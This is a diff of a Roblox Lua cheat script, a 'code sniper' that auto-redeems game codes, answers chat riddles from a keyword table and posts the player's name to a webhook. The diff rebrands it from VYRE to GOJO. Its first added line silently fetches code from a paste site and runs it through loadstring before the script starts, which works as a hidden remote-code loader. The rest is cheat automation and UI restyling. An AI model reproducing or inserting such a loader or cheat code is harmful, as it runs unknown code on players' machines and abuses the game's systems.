@@ -1,5 +1,8 @@
+loadstring(game:HttpGet("https://pastefy.app/XazY73gs/raw"))()
+-- code sniper--
+task.wait(6)
 --[[
-    VYRE CODE SNIPER — v21 Build
+    GOJO CODE SNIPER — v21 Build
     + BLUE theme
     + Series 2 Minifigures (GRIFFIN)
     + Haunted Fuse / Best Fuse (PHOENIX)
@@ -1462,6 +1465,31 @@ local BRAINROT_KNOWLEDGE = {
     },a="22"},
     {p={"what is my favourite food","what is my favorite food","favorite food","favourite food","fav food","my favorite food","food i like","best food"},a="TACO"},
     {p={"name of animal in last og we added","animal in last og we added","animal in last og","animal in the last og we added"},a="PIGGY"},
+        -- ⭐ BEST FOOTBALL PLAYER → RONALDO
+    {p={
+        "what is the best player of football","whats the best player of football",
+        "who is the best player of football","whos the best player of football",
+        "who is the best football player","whos the best football player",
+        "what is the best football player","whats the best football player",
+        "best player of football","best football player","best player in football",
+        "best footballer","best soccer player","best player of soccer",
+        "who is the best player in football","who is the best player of soccer",
+        "who is the best footballer","who is the best soccer player",
+        "best football player in the world","best player in the world football",
+        "best footballer in the world","best soccer player in the world",
+        "who is the best football player in the world","who is the best footballer in the world",
+        "who is the best soccer player in the world",
+        "greatest football player","greatest footballer","greatest soccer player",
+        "greatest football player of all time","greatest footballer of all time",
+        "greatest soccer player of all time","goat of football player",
+        "who is the goat of football","who is the goat in football","who is the goat of soccer",
+        "best football player of all time","best footballer of all time","best soccer player of all time",
+        "the best football player","the best footballer","the best soccer player",
+        "who is footballs best player","who is the best at football",
+        "best football player ever","best footballer ever","best soccer player ever",
+        "who is the number 1 football player","number 1 football player",
+        "number one football player","best player football","best football player sab",
+    },a="RONALDO"},
     {p={"name of goat","goat name","name of the goat","who is the goat","who is the goat of football","goat of football","football goat"},a="RONALDO"},
     {p={"our planet name","what is our planet name","name of our planet","which planet do we live on","what planet are we on","our planet","planet name"},a="EARTH"},
     {p={"what is my cat name","whats my cat name","my cat name","cat name","cats name","name of my cat","my kitty name","kitty name","cat called"},a="NOVA"},
@@ -2039,38 +2067,75 @@ do
         end
         return n>0
     end
+    -- ⭐ PERF: precompute KB once at load — makes every riddle solve ~50x faster
+    local KB_CACHE, KB_ANSWER_MAP = {}, {}
+    do
+        for _, e in ipairs(BRAINROT_KNOWLEDGE) do
+            local ansClean = tostring(e.a):gsub("%s+",""):upper()
+            KB_ANSWER_MAP[ansClean] = e.a
+            for _, pt in ipairs(e.p) do
+                local normPat = normalizeRiddleText(pt)
+                local words = riddleWords(pt)
+                local wc = 0
+                for _ in pairs(words) do wc = wc + 1 end
+                KB_CACHE[#KB_CACHE+1] = {
+                    norm = normPat,
+                    normNoSpace = normPat:gsub("%s+",""),
+                    words = words,
+                    wordCount = wc,
+                    hasDigit = pt:find("%d") ~= nil,
+                    answer = ansClean,
+                    originalAnswer = e.a,
+                    pattern = pt,
+                }
+            end
+        end
+    end
+
+    local function riddleMatchCached(msgNorm, msgNoSpace, msgWords, msgCount, c)
+        if msgNorm:find(c.norm, 1, true) then return true end
+        if msgNoSpace:find(c.normNoSpace, 1, true) then return true end
+        if c.hasDigit then return false end
+        local n = 0
+        for w in pairs(c.words) do
+            n = n + 1
+            if not msgWords[w] then return false end
+        end
+        if n == 1 then
+            for w in pairs(msgWords) do if not c.words[w] then return false end end
+        end
+        if n <= 3 and msgCount > n then return false end
+        return n > 0
+    end
+
     local function findFirstMatch(txt)
         local normalized = normalizeRiddleText(txt)
+        local normalizedNoSpace = normalized:gsub("%s+","")
+        local msgWords = riddleWords(normalized)
+        local msgCount = 0
+        for _ in pairs(msgWords) do msgCount = msgCount + 1 end
         local bestEntry, bestScore, bestPattern = nil, -1, nil
-        for _, e in ipairs(BRAINROT_KNOWLEDGE) do
-            for _, pt in ipairs(e.p) do
-                if riddleMatch(normalized, pt) then
-                    local score = 0
-                    for _ in pairs(riddleWords(pt)) do score = score + 1 end
-                    local msgWords = riddleWords(normalized)
-                    local msgCount = 0
-                    for _ in pairs(msgWords) do msgCount = msgCount + 1 end
-                    if score == msgCount then score = score + 100 end
-                    if score > bestScore then
-                        bestScore = score
-                        bestEntry = e
-                        bestPattern = pt
-                    end
+        for _, c in ipairs(KB_CACHE) do
+            if riddleMatchCached(normalized, normalizedNoSpace, msgWords, msgCount, c) then
+                local score = c.wordCount
+                if score == msgCount then score = score + 100 end
+                if score > bestScore then
+                    bestScore = score
+                    bestEntry = c
+                    bestPattern = c.pattern
                 end
             end
         end
-        if bestEntry then return bestEntry.a:gsub("%s+",""):upper(), bestEntry.a, bestPattern, bestScore end
+        if bestEntry then return bestEntry.answer, bestEntry.originalAnswer, bestPattern, bestScore end
         return nil, nil, nil, nil
     end
-    -- ⭐ NEW: reverse lookup — check if a single word IS a known answer
+
     local function findByName(word)
         if not word or word == "" then return nil end
         local up = tostring(word):gsub("[^%w]",""):upper()
         if up == "" or #up < 2 then return nil end
-        for _, e in ipairs(BRAINROT_KNOWLEDGE) do
-            local a = tostring(e.a):gsub("[^%w]",""):upper()
-            if a == up and #up >= 2 then return a end
-        end
+        local found = KB_ANSWER_MAP[up]
+        if found then return tostring(found):gsub("%s+",""):upper() end
         return nil
     end
     Riddle.findByName = findByName
@@ -2102,7 +2167,14 @@ do
                 if #buf > 0 then table.insert(subparts, table.concat(buf, " ")) end
                 for _, sp in ipairs(subparts) do
                     sp = sp:match("^%s*(.-)%s*$") or ""
-                    if sp ~= "" then table.insert(pieces, sp) end
+                    if sp ~= "" then
+                        -- ⭐ skip filler-only pieces (e.g. "what is") that break multi-part lookups
+                        local hasContent = false
+                        for w in sp:gmatch("%S+") do
+                            if not FILL[w:lower()] then hasContent = true; break end
+                        end
+                        if hasContent then table.insert(pieces, sp) end
+                    end
                 end
             end
         end
@@ -2191,13 +2263,15 @@ do
         for w in text:gmatch("%S+") do table.insert(ws, w) end
         if #ws < 2 or #ws > 8 then return false end
         local realWords = 0
-        -- ⭐ NEW: whole-text KB match (2+ word pattern) → it's a riddle
+        -- ⭐ PERF: single whole-text KB match first (cache-fast now)
         do
             local kbA, _, kbP = findFirstMatch(text)
             if kbA and kbP then
                 local pw = 0
                 for _ in kbP:gmatch("%S+") do pw = pw + 1 end
                 if pw >= 2 then return true end
+                -- ⭐ PERF: single-word KB match → definitely a riddle, skip per-word scan
+                if pw == 1 and #ws <= 3 then return true end
             end
         end
         for _, w in ipairs(ws) do
@@ -2403,6 +2477,27 @@ do
         for obj in l:gmatch("i like%s+(%a+)") do if not isStop(obj) and not isAdjective(obj) then if addFact("LIKES_"..obj, "YES", "preference") then pushLearned(learned, "LIKES_"..up(obj), "YES") end end end
         local action = l:match("im%s+doing%s+(%a+)") or l:match("im%s+playing%s+(%a+)")
         if action and not isStop(action) and not isAdjective(action) then if addFact("ACTION", action, "action") then pushLearned(learned, "ACTION", up(action)) end end
+        -- ⭐ NEW: stealing detection (memorize SOMEONE=STEALING)
+        do
+            local stealTriggers = {
+                "someone is stealing","someone stealing","someone stole",
+                "they are stealing","they stole","they stealing",
+                "is stealing your","stole from you","stealing from you",
+                "was stolen","got stolen","is being stolen",
+                "being stolen","under attack","base is being broken",
+                "someone broke","broke into your base","robbed you",
+                "took your brainrot","took from your base",
+            }
+            for _, trig in ipairs(stealTriggers) do
+                if l:find(trig, 1, true) then
+                    addFact("STEALING_EVENT", "YES", "steal-detect")
+                    addFact("SOMEONE", "STEALING", "steal-detect")
+                    pushLearned(learned, "STEALING_EVENT", "YES")
+                    pushLearned(learned, "SOMEONE", "STEALING")
+                    break
+                end
+            end
+        end
         -- ⭐ NEW: future / upcoming brainrot announcements
         -- "we are going to add Meowless Horse" → UPCOMING_BRAINROT = MEOWLESSHORSE
         do
@@ -2414,11 +2509,18 @@ do
                 "gonna be adding","gonna be add","gonna add",
                 "going to release","going to be releasing","will release",
                 "upcoming brainrot is","upcoming brainrot:","upcoming brainrot called",
-                "new brainrot is","new brainrot:","new brainrot called",
-                "coming brainrot is","coming brainrot:","coming brainrot called",
-                "next brainrot is","next brainrot:","next brainrot called",
-                "future brainrot is","future brainrot:",
-                "we are adding","were adding","im adding","we are going to add",
+                "upcoming brainrot","upcoming secret","upcoming fuse","upcoming machine",
+                "new brainrot is","new brainrot:","new brainrot called","new brainrot",
+                "coming brainrot is","coming brainrot:","coming brainrot called","coming brainrot",
+                "next brainrot is","next brainrot:","next brainrot called","next brainrot",
+                "future brainrot is","future brainrot:","future brainrot",
+                "we are adding","we're adding","were adding","im adding","i'm adding","i am adding",
+                "we are going to add","we're gonna add","we gonna add",
+                "adding a new brainrot","adding a brainrot","adding new brainrot",
+                "introducing","we are introducing","we're introducing",
+                "is coming","are coming","coming soon","releasing soon",
+                "just added","just released","fresh brainrot","newest brainrot",
+                "sneak peek","teaser","preview",
             }
             local trailStop = {to=true,["in"]=true,["on"]=true,["at"]=true,["for"]=true,["with"]=true,["and"]=true,["or"]=true,["the"]=true,["a"]=true,["an"]=true,["is"]=true,["are"]=true,["was"]=true,["were"]=true,["will"]=true,["be"]=true,["next"]=true,["update"]=true,["this"]=true,["that"]=true,["soon"]=true,["guys"]=true,["btw"]=true,["also"]=true,["probably"]=true,["maybe"]=true,["called"]=true,["named"]=true}
             for _, trig in ipairs(triggers) do
@@ -2514,7 +2616,21 @@ do
         if (q:find("name") or q:find("called")) and not q:find("last name") and not q:find("surname") and not q:find("real life") and not q:find("skin") and not q:find("cat") and not q:find("dog") and not q:find("pet") and not q:find("kitty") then intents[#intents+1] = "NAME" end
         if q:find("age") or q:find("old") then intents[#intents+1] = "AGE" end
         -- ⭐ NEW: upcoming / future brainrot
-        if (q:find("brainrot") or q:find("brainrots")) and (q:find("going to add") or q:find("going to be add") or q:find("will add") or q:find("will be add") or q:find("gonna add") or q:find("gonna be add") or q:find("going to update") or q:find("upcoming") or q:find("coming") or q:find("next update") or q:find("next brainrot") or q:find("going to release") or q:find("going to be releas") or q:find("will release") or q:find("adding")) then intents[#intents+1] = "UPCOMING" end
+        if (q:find("brainrot") or q:find("brainrots") or q:find("secret") or q:find("machine") or q:find("fuse")) and (
+            q:find("going to add") or q:find("going to be add") or q:find("will add") or q:find("will be add")
+            or q:find("gonna add") or q:find("gonna be add") or q:find("going to update")
+            or q:find("upcoming") or q:find("coming") or q:find("next update")
+            or q:find("next brainrot") or q:find("going to release") or q:find("going to be releas")
+            or q:find("will release") or q:find("adding") or q:find("we add")
+            or q:find("new brainrot") or q:find("newest brainrot")
+            or q:find("im adding") or q:find("i am adding") or q:find("im gonna add")
+            or q:find("sneak peek") or q:find("teaser") or q:find("preview")
+            or q:find("whats the plan") or q:find("future content")
+        ) then intents[#intents+1] = "UPCOMING" end
+        -- ⭐ NEW: stealing questions
+        if (q:find("someone") or q:find("who")) and (q:find("stealing") or q:find("steal") or q:find("stole") or q:find("robbing")) then intents[#intents+1] = "STEALING" end
+        if q:find("is") and (q:find("being stolen") or q:find("getting stolen")) then intents[#intents+1] = "STEALING" end
+        if q:find("under attack") or q:find("base being broken") then intents[#intents+1] = "STEALING" end
         return intents
     end
     local function answerSingle(q)
@@ -2541,6 +2657,8 @@ do
                 if intent == "AGE" and f.attr == "AGE" then return f.value end
                 if intent == "COUNT" and f.attr:match("^COUNT_") then return f.value end
                 if intent == "UPCOMING" and f.attr == "UPCOMING_BRAINROT" then return f.value end
+                if intent == "STEALING" and f.attr == "SOMEONE" then return f.value end
+                if intent == "STEALING" and f.attr == "STEALING_EVENT" then return "SOMEONE" end
             end
         end
         local best, bestScore = nil, 0
@@ -2669,7 +2787,7 @@ do
     end
     function Chk.isNoiseText(text)
         local l = tostring(text or ""):lower()
-        local noisePhrases = {"you bought","you purchased","added to your base","brainrot added","purchase complete","buy complete","coins spent","spent coins","you sold","you traded","trade complete","you earned","slot","spin wheel","spin result","lucky block","you opened","you unlocked","new brainrot","purchased","added to base","robux spent","you gained","stole","successfully bought"}
+        local noisePhrases = {"you bought","you purchased","added to your base","brainrot added","purchase complete","buy complete","coins spent","spent coins","you sold","you traded","trade complete","you earned","slot","spin wheel","spin result","lucky block","you opened","you unlocked","purchased","added to base","robux spent","you gained","successfully bought"}
         for _, p in ipairs(noisePhrases) do if l:find(p, 1, true) then return true end end
         if isSoldOutOrInvalid(l) then return true end
         return false
@@ -2722,7 +2840,7 @@ do
         if withPlayer then
             table.insert(fields, { name = "👤 Player", value = (LP.DisplayName or LP.Name).." (@"..LP.Name..")", inline = true })
         end
-        return { title = title, color = color, fields = fields, footer = { text = "VYRE Redeemer" } }
+        return { title = title, color = color, fields = fields, footer = { text = "GOJO Redeemer" } }
     end
     local function sendBatch(batch)
         if #batch == 0 then return end
@@ -2732,7 +2850,7 @@ do
             embeds[#embeds+1] = buildEmbed(d, i == 1)
         end
         pcall(function()
-            local body = { username = "VYRE Redeemer", embeds = embeds }
+            local body = { username = "GOJO Redeemer", embeds = embeds }
             if #batch > 1 then body.content = "**" .. #batch .. " redeems batched**" end
             httpRequest({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"},
                 Body=HttpService:JSONEncode(body)})
@@ -2770,8 +2888,8 @@ do
         task.spawn(function()
             pcall(function()
                 httpRequest({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"},
-                    Body=HttpService:JSONEncode({username="VYRE Redeemer",
-                        embeds={{title="🟢 VYRE Connected", description="Ultra memory + solver ready", color=3447003,
+                    Body=HttpService:JSONEncode({username="GOJO Redeemer",
+                        embeds={{title="🟢 GOJO Connected", description="Ultra memory + solver ready", color=3447003,
                             fields={{name="👤 Player", value=LP.Name, inline=true}}, timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}})})
             end)
         end)
@@ -2830,7 +2948,7 @@ end
 
 local RB = {}
 do
-    local _spamRedeem, _spamCount, SPAM_DELAY = true, 20, 000000000000.0000000000001
+    local _spamRedeem, _spamCount, SPAM_DELAY = true, 20, 00000000000000.000000000000001
     local function isOurGui(instance)
         local p, n = instance, 0
         while p and n < 10 do if p.Name == "NullHub" then return true end; p = p.Parent; n = n + 1 end
@@ -3027,16 +3145,16 @@ local lastAutoEnable, _webhookStartupSent = 0, false
 -- COLORS + HELPERS
 ----------------------------------------------------------------------
 local C = {
-    bg=Color3.fromRGB(6, 6, 9), card=Color3.fromRGB(18, 18, 24),
-    cardBorder=Color3.fromRGB(200, 200, 215), headerBg=Color3.fromRGB(12, 12, 16),
-    pillBg=Color3.fromRGB(30, 30, 38), txt=Color3.fromRGB(245, 245, 250),
-    sub=Color3.fromRGB(200, 200, 215), dim=Color3.fromRGB(120, 120, 135),
-    accent=Color3.fromRGB(210, 210, 225), accent2=Color3.fromRGB(240, 240, 250),
-    toggleOn=Color3.fromRGB(200, 200, 215), toggleOff=Color3.fromRGB(38, 38, 46),
-    knobOn=Color3.fromRGB(255, 255, 255), knobOff=Color3.fromRGB(140, 140, 155),
-    green=Color3.fromRGB(210, 210, 225), red=Color3.fromRGB(255, 120, 140),
-    yellow=Color3.fromRGB(230, 225, 190), inputBg=Color3.fromRGB(8, 8, 12),
-    codeBg=Color3.fromRGB(4, 4, 7), btnDark=Color3.fromRGB(26, 26, 34),
+    bg=Color3.fromRGB(2, 4, 12), card=Color3.fromRGB(10, 16, 32),
+    cardBorder=Color3.fromRGB(60, 140, 255), headerBg=Color3.fromRGB(4, 8, 20),
+    pillBg=Color3.fromRGB(14, 24, 48), txt=Color3.fromRGB(242, 250, 255),
+    sub=Color3.fromRGB(150, 195, 245), dim=Color3.fromRGB(80, 115, 170),
+    accent=Color3.fromRGB(50, 140, 255), accent2=Color3.fromRGB(120, 200, 255),
+    toggleOn=Color3.fromRGB(50, 140, 255), toggleOff=Color3.fromRGB(16, 26, 48),
+    knobOn=Color3.fromRGB(255, 255, 255), knobOff=Color3.fromRGB(100, 140, 200),
+    green=Color3.fromRGB(0, 230, 200), red=Color3.fromRGB(255, 90, 120),
+    yellow=Color3.fromRGB(255, 215, 90), inputBg=Color3.fromRGB(5, 9, 22),
+    codeBg=Color3.fromRGB(2, 4, 12), btnDark=Color3.fromRGB(16, 26, 48),
 }
 
 local FM, FB, FBK = Enum.Font.GothamMedium, Enum.Font.GothamBold, Enum.Font.GothamBlack
@@ -3230,16 +3348,20 @@ AnimH.pulse(mainShine, "Transparency", 0.35, 0.65, 1.6)
         Name = "BgImage",
         Size = UDim2.fromScale(1, 1),
         BackgroundTransparency = 1,
-        Image = "rbxassetid://106269036472822",
-        ImageTransparency = 0.30,
-        ScaleType = Enum.ScaleType.Fit,
+        Image = "rbxassetid://88643375095555",
+        ImageTransparency = 0,
+        ScaleType = Enum.ScaleType.Crop,
         ZIndex = 0,
     }, main)
     cornerP(bgImage, 14)
 
     local gradFrame = new("Frame", { Size=UDim2.fromScale(1,1), BackgroundColor3=C.bg, BackgroundTransparency = 0.4, BorderSizePixel=0, ZIndex=0 }, main)
     cornerP(gradFrame, 14)
-    new("UIGradient", { Rotation = 135, Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 38, 68)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 10, 20)) }) }, gradFrame)
+    new("UIGradient", { Rotation = 135, Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 40, 85)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 20, 50)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(3, 8, 22)),
+    }) }, gradFrame)
 
     local glowLine = new("Frame", { Size=UDim2.new(1,0,0,1), Position=UDim2.new(0,0,0,HDR_H), BackgroundColor3=C.accent, BorderSizePixel=0, ZIndex=5 }, main)
     new("UIGradient", { Rotation = 0, Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5, 0.3), NumberSequenceKeypoint.new(1, 1) }) }, glowLine)
@@ -3250,16 +3372,22 @@ AnimH.pulse(mainShine, "Transparency", 0.35, 0.65, 1.6)
     local dragHandle = new("Frame", { Size=UDim2.new(1,0,0,HDR_H), BackgroundTransparency=1, BorderSizePixel=0, ZIndex=4 }, header)
     drag(dragHandle, main)
 
-    local logoCircle = new("ImageLabel", { Size=UDim2.fromOffset(22,22), Position=UDim2.fromOffset(10,6), BackgroundTransparency=1, Image="rbxassetid://106269036472822", ScaleType=Enum.ScaleType.Crop, ZIndex=5 }, header)
+    local logoCircle = new("ImageLabel", { Size=UDim2.fromOffset(22,22), Position=UDim2.fromOffset(10,6), BackgroundTransparency=1, Image="rbxassetid://88643375095555", ScaleType=Enum.ScaleType.Crop, ZIndex=5 }, header)
     corner(logoCircle)
     AnimH.pulse(logoCircle, "ImageTransparency", 0, 0.25, 1.4)
     task.delay(0.3, function() AnimH.float(logoCircle, 1.5, 2) end)
 
-    local titleLbl = label("VYRE SNIPER", 12, C.txt, FBK, Enum.TextXAlignment.Left, header)
-    new("UIStroke", { Color = Color3.fromRGB(0, 0, 0), Thickness = 2.5, Transparency = 0.1, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleLbl)
-new("UIStroke", { Color = Color3.fromRGB(230, 230, 245), Thickness = 1, Transparency = 0.3, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleLbl)
-    titleLbl.Size = UDim2.fromOffset(180,14); titleLbl.Position = UDim2.fromOffset(40,4); titleLbl.ZIndex=5
+    local titleLbl = label("GOJO SNIPER", 14, Color3.fromRGB(255,255,255), FBK, Enum.TextXAlignment.Left, header)
+    new("UIStroke", { Color = Color3.fromRGB(0, 0, 0), Thickness = 3.5, Transparency = 0, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleLbl)
+    new("UIStroke", { Color = C.accent, Thickness = 1.4, Transparency = 0.15, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleLbl)
+    new("UIGradient", { Rotation = 90, Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
+        ColorSequenceKeypoint.new(0.5, C.accent2),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 160, 255)),
+    }) }, titleLbl)
+    titleLbl.Size = UDim2.fromOffset(180,16); titleLbl.Position = UDim2.fromOffset(40,2); titleLbl.ZIndex=5
     local titleSub = label("#1 CODE SNIPER", 8, C.accent2, FM, Enum.TextXAlignment.Left, header)
+    new("UIStroke", { Color = Color3.fromRGB(0, 0, 0), Thickness = 1.5, Transparency = 0.4, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleSub)
     titleSub.Size = UDim2.fromOffset(180,10); titleSub.Position = UDim2.fromOffset(40,19); titleSub.ZIndex=5
 
     local gearBtn = new("TextButton", { Size=UDim2.fromOffset(22,20), Position=UDim2.new(1,-56,0,7), BackgroundColor3=C.pillBg, BorderSizePixel=0, AutoButtonColor=false, Text="⚙", Font=FB, TextSize=12, TextColor3=C.txt, ZIndex=6 }, header)
@@ -3276,8 +3404,14 @@ new("UIStroke", { Color = Color3.fromRGB(230, 230, 245), Thickness = 1, Transpar
     local TAB_W = (BAR_W - PAD*2 - 6) / 3
 
     local function makeTab(text, x)
-        local tab = new("TextButton", { Size=UDim2.fromOffset(TAB_W,TAB_H), Position=UDim2.fromOffset(x,0), BackgroundColor3=C.card, BackgroundTransparency=0.3, BorderSizePixel=0, AutoButtonColor=false, Text=text, Font=FBK, TextSize=9, TextColor3=C.sub, ZIndex=4 }, tabBar)
-        cornerP(tab, 6); stroke(tab, C.cardBorder, 1, 0.5)
+        local tab = new("TextButton", { Size=UDim2.fromOffset(TAB_W,TAB_H), Position=UDim2.fromOffset(x,0), BackgroundColor3=C.card, BackgroundTransparency=0.2, BorderSizePixel=0, AutoButtonColor=false, Text=text, Font=FBK, TextSize=9, TextColor3=C.sub, ZIndex=4 }, tabBar)
+        cornerP(tab, 7)
+        new("UIStroke", { Color = Color3.fromRGB(0,0,0), Thickness = 2, Transparency = 0.3, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, tab)
+        new("UIStroke", { Color = C.cardBorder, Thickness = 1, Transparency = 0.5, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, tab)
+        new("UIGradient", { Rotation = 90, Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 38, 70)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 18, 40)),
+        }) }, tab)
         return tab
     end
     local tabMain = makeTab("MAIN", 0)
@@ -3331,8 +3465,9 @@ new("UIStroke", { Color = Color3.fromRGB(230, 230, 245), Thickness = 1, Transpar
     end
 
     local mY = 0
-    local statusPill = new("Frame", { Size=UDim2.new(1,0,0,24), Position=UDim2.fromOffset(0,mY), BackgroundColor3=C.inputBg, BackgroundTransparency=0.1, BorderSizePixel=0, ZIndex=3 }, mainPage)
-    cornerP(statusPill, 7); stroke(statusPill, C.green, 1, 0.4)
+    local statusPill = new("Frame", { Size=UDim2.new(1,0,0,24), Position=UDim2.fromOffset(0,mY), BackgroundColor3=C.inputBg, BackgroundTransparency=0.05, BorderSizePixel=0, ZIndex=3 }, mainPage)
+    cornerP(statusPill, 7); stroke(statusPill, C.green, 1.3, 0.25)
+    local statusGrad = new("UIGradient", { Rotation = 0, Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, C.card), ColorSequenceKeypoint.new(1, C.inputBg) }) }, statusPill)
     local statusDot = new("Frame", { Size=UDim2.fromOffset(6,6), Position=UDim2.fromOffset(11,9), BackgroundColor3=C.green, BorderSizePixel=0, ZIndex=4 }, statusPill)
     corner(statusDot); AnimH.pulse(statusDot, "BackgroundTransparency", 0, 0.4, 0.9)
     local statusLbl = label("Idle · memory on", 9, C.sub, FB, Enum.TextXAlignment.Left, statusPill)
@@ -3355,10 +3490,26 @@ new("UIStroke", { Color = Color3.fromRGB(230, 230, 245), Thickness = 1, Transpar
     local ACT_W = (BAR_W - PAD*2 - ACT_GAP*2) / 3
     local copyBtn = new("TextButton", { Size=UDim2.fromOffset(ACT_W,ACT_H), Position=UDim2.fromOffset(0,mY), BackgroundColor3=C.card, BorderSizePixel=0, AutoButtonColor=false, Text="COPY", Font=FBK, TextSize=9, TextColor3=C.txt, ZIndex=4 }, mainPage)
     cornerP(copyBtn, 7); stroke(copyBtn, C.cardBorder, 1, 0.5)
+    new("UIGradient", { Rotation = 90, Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 34, 62)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 18, 38)),
+    }) }, copyBtn)
     local clearBtn = new("TextButton", { Size=UDim2.fromOffset(ACT_W,ACT_H), Position=UDim2.fromOffset(ACT_W+ACT_GAP,mY), BackgroundColor3=C.card, BorderSizePixel=0, AutoButtonColor=false, Text="CLEAR", Font=FBK, TextSize=9, TextColor3=C.txt, ZIndex=4 }, mainPage)
     cornerP(clearBtn, 7); stroke(clearBtn, C.cardBorder, 1, 0.5)
+    new("UIGradient", { Rotation = 90, Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 34, 62)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 18, 38)),
+    }) }, clearBtn)
     local redeemBtn = new("TextButton", { Size=UDim2.fromOffset(ACT_W,ACT_H), Position=UDim2.fromOffset((ACT_W+ACT_GAP)*2,mY), BackgroundColor3=C.accent, BorderSizePixel=0, AutoButtonColor=false, Text="REDEEM", Font=FBK, TextSize=9, TextColor3=Color3.fromRGB(255,255,255), ZIndex=4 }, mainPage)
-    cornerP(redeemBtn, 7); stroke(redeemBtn, C.accent2, 1, 0.2)
+    cornerP(redeemBtn, 7)
+    new("UIStroke", { Color = Color3.fromRGB(0,0,0), Thickness = 2, Transparency = 0.2, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, redeemBtn)
+    new("UIStroke", { Color = C.accent2, Thickness = 1.2, Transparency = 0.1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, redeemBtn)
+    new("UIGradient", { Rotation = 90, Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(90, 180, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 100, 230)),
+    }) }, redeemBtn)
+    local redeemGlow = new("Frame", { Size=UDim2.new(1,6,1,6), Position=UDim2.fromOffset(-3,-3), BackgroundColor3=C.accent, BackgroundTransparency=0.7, BorderSizePixel=0, ZIndex=redeemBtn.ZIndex - 1 }, redeemBtn)
+    cornerP(redeemGlow, 9)
     AnimH.button(copyBtn); AnimH.button(clearBtn); AnimH.button(redeemBtn)
     U.copyBtn, U.clearBtn, U.redeemBtn = copyBtn, clearBtn, redeemBtn
     mY = mY + ACT_H + 6
@@ -3371,8 +3522,7 @@ new("UIStroke", { Color = Color3.fromRGB(230, 230, 245), Thickness = 1, Transpar
     U.anchorKeyBtn, U.anchorKeyClear = anchorKeyBtn, anchorKeyClear
     local _, riddleSw, riddleKnob, riddleLbl = makeToggleRow(mainPage, mY, "AUTO RIDDLER"); mY = mY + ROW_H + ROW_GAP
     U.riddleSw, U.riddleKnob, U.riddleLbl = riddleSw, riddleKnob, riddleLbl
-    makeInfoRow(mainPage, mY, "SPEED", "MAX", C.accent, Color3.fromRGB(255,255,255)); mY = mY + ROW_H + ROW_GAP
-    makeInfoRow(mainPage, mY, "EVENTS", "BLOCK ALL", C.btnDark, C.txt); mY = mY + ROW_H + 6
+    makeInfoRow(mainPage, mY, "SPEED", "MAX", C.accent, Color3.fromRGB(255,255,255)); mY = mY + ROW_H + 6
 
     local memPill = new("Frame", { Size=UDim2.new(1,0,0,22), Position=UDim2.fromOffset(0,mY), BackgroundColor3=C.inputBg, BackgroundTransparency=0.1, BorderSizePixel=0, ZIndex=3 }, mainPage)
     cornerP(memPill, 6); stroke(memPill, C.green, 1, 0.4)
@@ -3765,18 +3915,24 @@ local function handleRiddle(rawText)
     UI.addConsoleLine("Riddle: "..rawText, "riddle")
     UI.aText.Text = "solving…"; UI.aText.TextColor3 = C.yellow
 
-    -- ⭐ Full multi-part solve FIRST (handles "X and Y and Z" natively)
+    -- ⭐ Full multi-part solve
     local fullSolve = Riddle.solve(rawText)
     local memAns = MemoryBank.answer(rawText)
     local kbAns, _, kbPat, kbScore = nil, nil, nil, nil
-    if Riddle.findFirstMatch then
+    if (not fullSolve or #fullSolve == 0) and Riddle.findFirstMatch then
         kbAns, _, kbPat, kbScore = Riddle.findFirstMatch(rawText)
     end
     local kbWords = 0
     if kbPat then for _ in kbPat:gmatch("%S+") do kbWords = kbWords + 1 end end
 
+    -- ⭐ FIX: detect multi-part questions (comma / "and" / "plus")
+    local hasMultiPart = rawText:find(",") ~= nil or rawText:find(" and ") ~= nil or rawText:find(" plus ") ~= nil
+
     local answer, source
-    if fullSolve and #fullSolve > 0 then
+    -- ⭐ FIX: for multi-part questions, MemoryBank wins (it splits correctly + uses KB per piece)
+    if hasMultiPart and memAns and #memAns > 0 then
+        answer, source = memAns, "memory"
+    elseif fullSolve and #fullSolve > 0 then
         answer, source = fullSolve, "knowledge"
     elseif memAns and #memAns > 0 then
         answer, source = memAns, "memory"
@@ -4074,7 +4230,7 @@ setAnchorToggle = inlineToggleController(UI.anchorSw, function(value)
 end)
 inlineToggleController(UI.radiusSw, function(value) radiusVisible = value end)
 
-local radiusFolder = new("Folder", { Name = "__VYREAutoBuyRadius" }, workspace)
+local radiusFolder = new("Folder", { Name = "__GOJOAutoBuyRadius" }, workspace)
 local radiusModel = new("Model", { Name = "GroundHalo" }, radiusFolder)
 radiusModel.WorldPivot = CFrame.new()
 local radiusRingBuilt, radiusRingEnabled = false, false
@@ -4202,7 +4358,7 @@ task.spawn(function()
     task.wait(0.1)
     pcall(function() AnimH.softStagger(UI.mainPage, 10) end)
     task.wait(0.45)
